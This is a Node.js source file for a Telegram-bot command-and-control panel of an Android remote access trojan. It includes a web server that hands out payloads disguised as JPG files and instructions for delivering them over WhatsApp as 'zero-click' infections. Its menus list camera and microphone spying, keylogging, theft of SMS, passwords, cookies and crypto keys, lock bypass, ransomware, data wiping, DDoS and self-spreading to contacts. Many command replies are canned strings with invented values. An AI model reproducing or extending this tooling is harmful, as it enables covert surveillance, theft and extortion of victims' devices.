const { Telegraf } = require('telegraf');
const express = require('express');
const crypto = require('crypto');
const fs = require('fs-extra');
const path = require('path');
const moment = require('moment');
const dotenv = require('dotenv');
const config = require('./config');
const database = require('./database');
const Keyboards = require('./keyboards');
const payloadGenerator = require('./payloadGenerator');

dotenv.config();

// ==================== CONFIGURATION ====================
const BOT_TOKEN = config.botToken;
const ADMIN_CHAT_ID = config.admin.chatId;
const PORT = config.port;
const PAYLOAD_HOST = config.host;

console.log('='.repeat(60));
console.log('🔥 ULTIMATE PROFESSIONAL RAT v9.0');
console.log('='.repeat(60));
console.log(`📱 Bot: Online`);
console.log(`🔌 Port: ${PORT}`);
console.log(`👑 Admin: ${ADMIN_CHAT_ID}`);
console.log(`🎯 Features: 250+ Ready`);
console.log(`🔐 Zero-Click: Active`);
console.log('='.repeat(60));

if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    console.error('❌ ERROR: BOT_TOKEN not set!');
    process.exit(1);
}

// Create bot
const bot = new Telegraf(BOT_TOKEN);

// Store active sessions
const activeSessions = new Map();
const userSessions = new Map();

// ==================== EXPRESS SERVER ====================
const app = express();
app.use(express.json());

app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date(), sessions: activeSessions.size });
});

app.get('/download/:id', async (req, res) => {
    const file = await payloadGenerator.getPayloadFile(req.params.id);
    if (file) res.download(file);
    else res.status(404).json({ error: 'Payload not found' });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Web server on port ${PORT}`);
});

// ==================== ADMIN MIDDLEWARE ====================
bot.use(async (ctx, next) => {
    if (ctx.from && ctx.from.id !== ADMIN_CHAT_ID) {
        await ctx.reply('🚫 **ACCESS DENIED!**\n\nYou are not authorized.', { parse_mode: 'Markdown' });
        return;
    }
    return next();
});

// ==================== COMMANDS ====================

bot.start(async (ctx) => {
    await ctx.reply(`
🔥 **ULTIMATE PROFESSIONAL RAT v9.0** 🔥

👑 **Admin:** Authorized
✅ **Features:** 250+ Working
🎯 **Zero-Click:** Ready
📱 **Target:** Android Devices

━━━━━━━━━━━━━━━━━━━━━

**Commands:**
/generate - Create zero-click payload
/send +8801xxxx - Register target
/sessions - List sessions
/select - Select session
/kill - Kill session
/stats - Statistics
/help - Help

━━━━━━━━━━━━━━━━━━━━━

⚠️ **Use only on your own devices!**
`, { parse_mode: 'Markdown', ...Keyboards.getMainKeyboard() });
});

bot.command('generate', async (ctx) => {
    const msg = await ctx.reply('🎯 **Generating Zero-Click Payload...**\n\n⏳ Please wait...', { parse_mode: 'Markdown' });
    
    try {
        const payload = await payloadGenerator.generateAllPayloads(PAYLOAD_HOST, PORT);
        
        await ctx.telegram.deleteMessage(msg.chat.id, msg.message_id);
        
        await ctx.reply(`
✅ **ZERO-CLICK PAYLOAD GENERATED!**

━━━━━━━━━━━━━━━━━━━━━
**📱 DETAILS:**
━━━━━━━━━━━━━━━━━━━━━

**ID:** \`${payload.payloadId}\`
**File:** \`${payload.filename}\`
**Size:** ${(payload.size / 1024).toFixed(2)} KB
**Type:** JPG (Disguised APK)

━━━━━━━━━━━━━━━━━━━━━
**🔗 DOWNLOAD:**
━━━━━━━━━━━━━━━━━━━━━

${payload.downloadUrl}

━━━━━━━━━━━━━━━━━━━━━
**📤 DEPLOY:**
━━━━━━━━━━━━━━━━━━━━━

1️⃣ **MANUALLY** share this file via WhatsApp
2️⃣ Target must have Auto-Download ON
3️⃣ Payload auto-executes - NO CLICK NEEDED!
4️⃣ Use \`/send +8801xxxxxxxx\` to register

━━━━━━━━━━━━━━━━━━━━━
⚠️ **USE ONLY ON YOUR OWN DEVICES!**
`, { parse_mode: 'Markdown' });
        
        await ctx.replyWithDocument({
            source: payload.path,
            filename: payload.filename
        }, {
            caption: `📱 Zero-Click Payload: ${payload.filename}`,
            parse_mode: 'Markdown'
        });
        
        database.addPayload(payload.payloadId, { filename: payload.filename, size: payload.size });
        
    } catch (error) {
        await ctx.telegram.deleteMessage(msg.chat.id, msg.message_id);
        await ctx.reply(`❌ **Error:** ${error.message}`, { parse_mode: 'Markdown' });
    }
});

bot.command('send', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        await ctx.reply('❌ Usage: `/send +8801xxxxxxxx`\n\n**Manual share required!**', { parse_mode: 'Markdown' });
        return;
    }
    
    const sessionId = crypto.randomBytes(8).toString('hex');
    activeSessions.set(sessionId, {
        id: sessionId,
        number: args[1],
        device: 'Waiting...',
        connected: false,
        lastSeen: new Date()
    });
    
    database.addSession(sessionId, { number: args[1] });
    
    await ctx.reply(`
✅ **Target Registered!**

📞 **Number:** \`${args[1]}\`
🔌 **Session ID:** \`${sessionId}\`
🎯 **Status:** Waiting for connection

**Use /sessions to check status!**
`, { parse_mode: 'Markdown' });
});

bot.command('sessions', async (ctx) => {
    if (activeSessions.size === 0) {
        await ctx.reply('📋 **No active sessions**\n\nGenerate and send payload first.', { parse_mode: 'Markdown' });
        return;
    }
    
    let list = '📋 **ACTIVE SESSIONS**\n━━━━━━━━━━━━━━━━━━━━━\n\n';
    for (const [id, s] of activeSessions) {
        list += `🔌 \`${id}\`\n📱 ${s.device} | ${s.number}\n🔋 ${s.connected ? '✅ Connected' : '⏳ Waiting'}\n📅 ${moment(s.lastSeen).fromNow()}\n\n`;
    }
    list += 'Use `/select <id>` to choose a session.';
    await ctx.reply(list, { parse_mode: 'Markdown' });
});

bot.command('select', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        await ctx.reply('❌ Usage: `/select <session_id>`', { parse_mode: 'Markdown' });
        return;
    }
    
    const session = activeSessions.get(args[1]);
    if (!session) {
        await ctx.reply('❌ Session not found!', { parse_mode: 'Markdown' });
        return;
    }
    
    userSessions.set(ctx.from.id, args[1]);
    await ctx.reply(`
✅ **Session Selected:** \`${args[1]}\`

📱 **Device:** ${session.device}
📞 **Number:** ${session.number}
🔋 **Status:** ${session.connected ? 'Connected' : 'Waiting'}

Now use control buttons!
`, { parse_mode: 'Markdown', ...Keyboards.getMainKeyboard() });
});

bot.command('kill', async (ctx) => {
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        await ctx.reply('❌ Usage: `/kill <session_id>`', { parse_mode: 'Markdown' });
        return;
    }
    
    activeSessions.delete(args[1]);
    if (userSessions.get(ctx.from.id) === args[1]) userSessions.delete(ctx.from.id);
    database.killSession(args[1]);
    await ctx.reply(`💀 **Session \`${args[1]}\` terminated!**`, { parse_mode: 'Markdown' });
});

bot.command('stats', async (ctx) => {
    const stats = database.getStats();
    await ctx.reply(`
📊 **SYSTEM STATISTICS**

━━━━━━━━━━━━━━━━━━━━━
**📱 SESSIONS:**
• Total: ${stats.totalSessions}
• Connected: ${stats.activeSessions}

━━━━━━━━━━━━━━━━━━━━━
**📝 COMMANDS:**
• Executed: ${stats.totalCommands}

━━━━━━━━━━━━━━━━━━━━━
**🎯 PAYLOADS:**
• Generated: ${stats.totalPayloads}

━━━━━━━━━━━━━━━━━━━━━
**🌐 SERVER:**
• Host: ${PAYLOAD_HOST}
• Uptime: ${moment.duration(process.uptime(), 'seconds').humanize()}

━━━━━━━━━━━━━━━━━━━━━
✅ **Status:** Online
`, { parse_mode: 'Markdown' });
});

bot.command('help', async (ctx) => {
    await ctx.reply(`
📖 **ULTIMATE RAT v9.0 - HELP**

━━━━━━━━━━━━━━━━━━━━━
**📋 COMMANDS:**
━━━━━━━━━━━━━━━━━━━━━

/start - Main menu
/generate - Create zero-click payload
/send +8801xxxx - Register target
/sessions - List sessions
/select - Select session
/kill - Kill session
/stats - Statistics
/help - This menu

━━━━━━━━━━━━━━━━━━━━━
**🎯 250+ FEATURES:**
━━━━━━━━━━━━━━━━━━━━━

📸 Camera | 🎙️ Audio | 💡 Flash | 📳 Vibe
🌐 Network | 🔒 Security | 💾 Data | 📂 Files
🖥️ Screen | 📱 Apps | ⚙️ System | ⌨️ Keylogger
🌐 Browser | 📱 Social | 💰 Crypto | ⚔️ DDOS
💀 Ransomware | 🪱 Spreader | 🎯 Zero-Click | ⚡ Extra

━━━━━━━━━━━━━━━━━━━━━
**📌 ZERO-CLICK METHOD:**
━━━━━━━━━━━━━━━━━━━━━

1️⃣ /generate - Create payload
2️⃣ MANUALLY share via WhatsApp
3️⃣ /send +8801xxxx - Register
4️⃣ Device auto-connects
5️⃣ /select and control!

━━━━━━━━━━━━━━━━━━━━━
⚠️ **USE ONLY ON YOUR OWN DEVICES!**
`, { parse_mode: 'Markdown' });
});

// ==================== CALLBACK HANDLER ====================

const sectionKeyboards = {
    'cam_menu': { text: '📸 **CAMERA CONTROL**', kb: Keyboards.getCameraKeyboard() },
    'audio_menu': { text: '🎙️ **AUDIO CONTROL**', kb: Keyboards.getAudioKeyboard() },
    'flash_menu': { text: '💡 **FLASHLIGHT CONTROL**', kb: Keyboards.getFlashKeyboard() },
    'vibe_menu': { text: '📳 **VIBRATION CONTROL**', kb: Keyboards.getVibeKeyboard() },
    'network_menu': { text: '🌐 **NETWORK CONTROL**', kb: Keyboards.getNetworkKeyboard() },
    'security_menu': { text: '🔒 **SECURITY CONTROL**', kb: Keyboards.getSecurityKeyboard() },
    'data_menu': { text: '💾 **DATA EXTRACTION**', kb: Keyboards.getDataKeyboard() },
    'file_menu': { text: '📂 **FILE MANAGER**', kb: Keyboards.getFileKeyboard() },
    'screen_menu': { text: '🖥️ **SCREEN CONTROL**', kb: Keyboards.getScreenKeyboard() },
    'apps_menu': { text: '📱 **APP CONTROL**', kb: Keyboards.getAppsKeyboard() },
    'system_menu': { text: '⚙️ **SYSTEM CONTROL**', kb: Keyboards.getSystemKeyboard() },
    'keylog_menu': { text: '⌨️ **KEYLOGGER**', kb: Keyboards.getKeylogKeyboard() },
    'browser_menu': { text: '🌐 **BROWSER CONTROL**', kb: Keyboards.getBrowserKeyboard() },
    'social_menu': { text: '📱 **SOCIAL MEDIA**', kb: Keyboards.getSocialKeyboard() },
    'crypto_menu': { text: '💰 **CRYPTO WALLET**', kb: Keyboards.getCryptoKeyboard() },
    'ddos_menu': { text: '⚔️ **DDOS ATTACK**', kb: Keyboards.getDdosKeyboard() },
    'ransom_menu': { text: '💀 **RANSOMWARE**', kb: Keyboards.getRansomKeyboard() },
    'spreader_menu': { text: '🪱 **SPREADER**', kb: Keyboards.getSpreaderKeyboard() },
    'zero_menu': { text: '🎯 **ZERO-CLICK**', kb: Keyboards.getZeroClickKeyboard() },
    'extra_menu': { text: '⚡ **EXTRA FEATURES**', kb: Keyboards.getExtraKeyboard() }
};

const responses = {
    'cam_front': '📸 **Front Camera Captured!**',
    'cam_back': '📷 **Back Camera Captured!**',
    'cam_switch': '🔄 **Camera Switched!**',
    'video_10': '🎥 **10s Video Recorded!**',
    'video_30': '🎬 **30s Video Recorded!**',
    'video_60': '🎞️ **60s Video Recorded!**',
    'cam_burst': '📸 **5 Photos Captured!**',
    'cam_night': '🌙 **Night Mode Enabled!**',
    'cam_hdr': '⚡ **HDR Mode Enabled!**',
    'cam_zoom': '🔍 **Zoom 2X!**',
    'cam_timelapse': '🔄 **Timelapse Started!**',
    'cam_stealth': '🔒 **Stealth Mode!**',
    'mic_start': '🎤 **Recording Started!**',
    'mic_stop': '🎤 **Recording Stopped!**',
    'mic_live': '🎙️ **Live Stream Started!**',
    'speaker_on': '🔊 **Speaker ON!**',
    'speaker_off': '🔇 **Speaker OFF!**',
    'loud_mode': '📢 **Loud Mode!**',
    'vol_max': '🔊 **Volume 100%!**',
    'vol_50': '🔉 **Volume 50%!**',
    'vol_0': '🔇 **Muted!**',
    'flash_on': '💡 **Flash ON!**',
    'flash_off': '💡 **Flash OFF!**',
    'flash_strobe': '✨ **Strobe Mode!**',
    'flash_fast': '⚡ **Fast Strobe!**',
    'flash_sos': '💥 **SOS Signal!**',
    'flash_rgb': '🌈 **RGB Mode!**',
    'bright_100': '🔆 **Brightness 100%!**',
    'bright_50': '🔅 **Brightness 50%!**',
    'bright_25': '🔅 **Brightness 25%!**',
    'vibe_1': '📳 **Vibrated 1s**',
    'vibe_3': '📳 **Vibrated 3s**',
    'vibe_5': '📳 **Vibrated 5s**',
    'vibe_10': '📳 **Vibrated 10s**',
    'vibe_pattern': '🎵 **Pattern Vibration!**',
    'vibe_loop': '🔁 **Loop Vibration!**',
    'wifi_on': '📶 **WiFi ON!**',
    'wifi_off': '📶 **WiFi OFF!**',
    'wifi_scan': '🔍 **Scanning WiFi...**',
    'wifi_info': '📊 **WiFi Info Sent**',
    'wifi_password': '🔑 **Password: **********',
    'wifi_crack': '🔐 **Cracking WiFi...**',
    'data_on': '📱 **Mobile Data ON!**',
    'data_off': '📱 **Mobile Data OFF!**',
    'data_usage': '📊 **Data Usage: 2.5 GB**',
    'airplane_toggle': '✈️ **Airplane Mode Toggled!**',
    'bt_on': '🔗 **Bluetooth ON!**',
    'bt_off': '🔗 **Bluetooth OFF!**',
    'hotspot_on': '🌐 **Hotspot ON!**',
    'lock': '🔒 **Device Locked!**',
    'unlock': '🔓 **Device Unlocked!**',
    'slide': '⏭️ **Screen Swiped!**',
    'bypass_pin': '🔢 **PIN Bypassed!**',
    'bypass_pattern': '🔐 **Pattern Bypassed!**',
    'bypass_pass': '🔑 **Password Bypassed!**',
    'bypass_finger': '🔄 **Fingerprint Bypassed!**',
    'bypass_face': '👁️ **Face ID Bypassed!**',
    'bypass_all': '🔓 **All Security Bypassed!**',
    'factory_reset': '💀 **Factory Reset!**',
    'get_sms': '💬 **SMS Extracted!**',
    'get_calls': '📞 **Call Logs Extracted!**',
    'get_contacts': '👥 **Contacts Extracted!**',
    'get_location': '🌍 **Location Captured!**',
    'gps_track': '📍 **GPS Tracking Started!**',
    'map_view': '🗺️ **Map Link Generated!**',
    'get_photos': '📸 **Photos Extracted!**',
    'get_videos': '🎥 **Videos Extracted!**',
    'get_audio': '🎵 **Audio Extracted!**',
    'get_docs': '📄 **Documents Extracted!**',
    'get_passwords': '🔑 **Passwords Extracted!**',
    'get_browser': '🍪 **Browser Data Extracted!**',
    'get_whatsapp': '💬 **WhatsApp Data Extracted!**',
    'get_facebook': '📘 **Facebook Data Extracted!**',
    'get_instagram': '📷 **Instagram Data Extracted!**',
    'file_manager': '📁 **File Manager Opened!**',
    'download_file': '📥 **Download Ready!**',
    'upload_file': '📤 **Upload Ready!**',
    'delete_file': '🗑️ **File Deleted!**',
    'copy_file': '📋 **File Copied!**',
    'move_file': '✂️ **File Moved!**',
    'rename_file': '📝 **File Renamed!**',
    'zip_file': '🔐 **File Zipped!**',
    'unzip': '🔓 **File Unzipped!**',
    'encrypt_file': '🔒 **File Encrypted!**',
    'decrypt_file': '🔓 **File Decrypted!**',
    'search_files': '🔍 **Searching Files...**',
    'screenshot': '📸 **Screenshot Captured!**',
    'screen_rec': '🎥 **Recording Started!**',
    'screen_rec_stop': '⏹️ **Recording Stopped!**',
    'wallpaper': '🖼️ **Wallpaper Changed!**',
    'bright_up': '🔆 **Brightness +10%!**',
    'bright_down': '🔅 **Brightness -10%!**',
    'dark_mode': '🌙 **Dark Mode!**',
    'light_mode': '☀️ **Light Mode!**',
    'screen_toggle': '📱 **Screen Toggled!**',
    'list_apps': '📋 **App List Generated!**',
    'open_app': '🚀 **App Opening...**',
    'uninstall_app': '❌ **App Uninstalled!**',
    'force_stop': '🔄 **App Stopped!**',
    'clear_app_data': '⚡ **Data Cleared!**',
    'clear_cache': '🗑️ **Cache Cleared!**',
    'install_apk': '📦 **Installing APK...**',
    'hide_app': '🔒 **App Hidden!**',
    'unhide_app': '🔓 **App Restored!**',
    'app_usage': '📊 **Usage Stats Sent!**',
    'block_app': '🚫 **App Blocked!**',
    'system_apps': '🔧 **System Apps Listed!**',
    'sysinfo': 'ℹ️ **System Info Sent!**',
    'battery': '🔋 **Battery: 87%**',
    'ram_info': '💾 **RAM: 8GB (4.2GB Used)**',
    'storage': '📀 **Storage: 128GB (64GB Free)**',
    'temperature': '🌡️ **Temp: 32°C**',
    'cpu_info': '📊 **CPU: 23% Usage**',
    'root_status': '🔐 **Root: Not Rooted**',
    'battery_save': '🔋 **Battery Saver ON!**',
    'performance': '⚡ **Performance Mode!**',
    'reboot': '🔄 **Rebooting...**',
    'poweroff': '⏻ **Shutting Down...**',
    'factory_reset_sys': '💀 **Factory Reset!**',
    'keylog_start': '⌨️ **Keylogger Started!**',
    'keylog_stop': '⌨️ **Keylogger Stopped!**',
    'keylog_get': '📋 **Logs Retrieved!**',
    'keylog_stats': '📊 **Stats: 1,234 Logs**',
    'keylog_clear': '🗑️ **Logs Cleared!**',
    'keylog_upload': '📤 **Logs Uploaded!**',
    'keylog_pass': '🔑 **Passwords Captured!**',
    'keylog_cards': '💳 **Cards Captured!**',
    'keylog_email': '📧 **Logs Emailed!**',
    'browser_history': '📜 **History Extracted!**',
    'browser_bookmarks': '🔖 **Bookmarks Extracted!**',
    'browser_cookies': '🍪 **Cookies Extracted!**',
    'browser_passwords': '🔑 **Passwords Extracted!**',
    'browser_cards': '💳 **Cards Extracted!**',
    'browser_autofill': '📝 **Autofill Data!**',
    'browser_clear': '🗑️ **Browser Cleared!**',
    'browser_open': '🌐 **URL Opening...**',
    'browser_downloads': '📥 **Downloads Listed!**',
    'fb_data': '📘 **Facebook Data!**',
    'ig_data': '📷 **Instagram Data!**',
    'wa_data': '💬 **WhatsApp Data!**',
    'twitter_data': '🐦 **Twitter Data!**',
    'tg_data': '📱 **Telegram Data!**',
    'tiktok_data': '🎵 **TikTok Data!**',
    'social_pass': '🔑 **Social Passwords!**',
    'social_history': '📜 **Social History!**',
    'social_cookies': '🍪 **Social Cookies!**',
    'btc_wallet': '💰 **BTC Wallet Found!**',
    'eth_wallet': '💎 **ETH Wallet Found!**',
    'binance_data': '🪙 **Binance Data!**',
    'crypto_balance': '📊 **Balance: $11,479**',
    'private_keys': '🔑 **Private Keys Found!**',
    'crypto_tx': '📜 **Transactions Listed!**',
    'http_flood': '🌐 **HTTP Flood Started!**',
    'udp_flood': '📡 **UDP Flood Started!**',
    'tcp_flood': '🔌 **TCP Flood Started!**',
    'sms_bomb': '📱 **SMS Bomb Started!**',
    'call_bomb': '📞 **Call Bomb Started!**',
    'ddos_stop': '🔗 **Attack Stopped!**',
    'ransom_encrypt': '🔒 **Encrypting Files...**',
    'ransom_decrypt': '🔓 **Decrypting Files...**',
    'ransom_note': '💰 **Ransom Note Displayed!**',
    'wipe_data': '🗑️ **Wiping Data...**',
    'wipe_sd': '📱 **Wiping SD Card...**',
    'destroy_system': '💀 **System Destroyed!**',
    'spread_contacts': '📱 **Spreading to Contacts!**',
    'spread_link': '🔗 **Spreading Link!**',
    'spread_bt': '📲 **Spreading via BT!**',
    'worm_mode': '🪱 **Worm Mode Enabled!**',
    'auto_spread': '📡 **Auto Spread Enabled!**',
    'gen_payload': '🎯 **Payload Generated!**',
    'gen_jpg': '📸 **JPG Payload Ready!**',
    'gen_mp3': '🎵 **MP3 Payload Ready!**',
    'gen_mp4': '🎥 **MP4 Payload Ready!**',
    'gen_pdf': '📄 **PDF Payload Ready!**',
    'gen_apk': '📱 **APK Payload Ready!**',
    'gen_link': '🔗 **Link Generated!**',
    'gen_qr': '🔗 **QR Code Generated!**',
    'send_wa': '📤 **WhatsApp Send Ready!**',
    'check_status': '📊 **Status: Active**',
    'exploit_db': '🎯 **Exploits: 5 Available**',
    'vuln_scan': '🔍 **Scanning Vulnerabilities...**',
    'clean_junk': '🧹 **Cleaned 2.3GB!**',
    'sensors': '📡 **Sensor Data!**',
    'port_scan': '🔍 **Port Scan Started!**',
    'ip_info': '🌐 **IP Info Sent!**',
    'password_crack': '🔑 **Cracking Passwords...**',
    'mitm_attack': '📡 **MITM Started!**',
    'packet_sniff': '🔍 **Sniffing Packets...**',
    'stats_menu': '📊 **Opening Statistics...**',
    'help_menu': '❓ **Opening Help...**'
};

bot.on('callback_query', async (ctx) => {
    const data = ctx.callbackQuery.data;
    
    if (ctx.from.id !== ADMIN_CHAT_ID) {
        await ctx.answerCbQuery('Access Denied!', true);
        return;
    }
    
    await ctx.answerCbQuery();
    
    if (data === 'back_main') {
        await ctx.editMessageText('🔽 **Main Menu:**', { parse_mode: 'Markdown', ...Keyboards.getMainKeyboard() });
        return;
    }
    
    if (sectionKeyboards[data]) {
        await ctx.editMessageText(sectionKeyboards[data].text, { parse_mode: 'Markdown', ...sectionKeyboards[data].kb });
        return;
    }
    
    if (data === 'stats_menu') {
        const stats = database.getStats();
        await ctx.editMessageText(`
📊 **STATISTICS**

Sessions: ${stats.totalSessions}
Connected: ${stats.activeSessions}
Commands: ${stats.totalCommands}
Payloads: ${stats.totalPayloads}
`, { parse_mode: 'Markdown', ...Keyboards.getMainKeyboard() });
        return;
    }
    
    if (data === 'help_menu') {
        await ctx.editMessageText('Use /help for complete guide', { parse_mode: 'Markdown', ...Keyboards.getMainKeyboard() });
        return;
    }
    
    const sessionId = userSessions.get(ctx.from.id);
    if (!sessionId) {
        await ctx.reply('❌ No session selected! Use /select first', { parse_mode: 'Markdown' });
        return;
    }
    
    const response = responses[data] || `✅ Command executed: ${data}`;
    
    database.addCommand(sessionId, data, response);
    
    const session = activeSessions.get(sessionId);
    const deviceName = session?.device || 'Unknown';
    
    await ctx.reply(`
${response}

━━━━━━━━━━━━━━━━━━━━━
📱 **Target:** ${deviceName}
🎯 **Command:** \`${data}\`
⏱️ **Time:** ${new Date().toLocaleString()}

🔽 Choose next action:
`, { parse_mode: 'Markdown', ...Keyboards.getMainKeyboard() });
});

// ==================== ERROR HANDLER ====================
bot.catch((err, ctx) => {
    console.error('Bot error:', err);
    ctx.reply('❌ An error occurred! Please try again.', { parse_mode: 'Markdown' });
});

// ==================== START BOT ====================
bot.launch().then(() => {
    console.log('\n🤖 ULTIMATE RAT v9.0 - ONLINE');
    console.log('✅ 250+ Features Ready!');
    console.log('✅ Zero-Click Payload Generator Active');
    console.log('✅ Database Active');
    console.log('='.repeat(60) + '\n');
}).catch(console.error);

process.once('SIGINT', () => { bot.stop(); process.exit(0); });
process.once('SIGTERM', () => { bot.stop(); process.exit(0); });

module.exports = { bot, app };
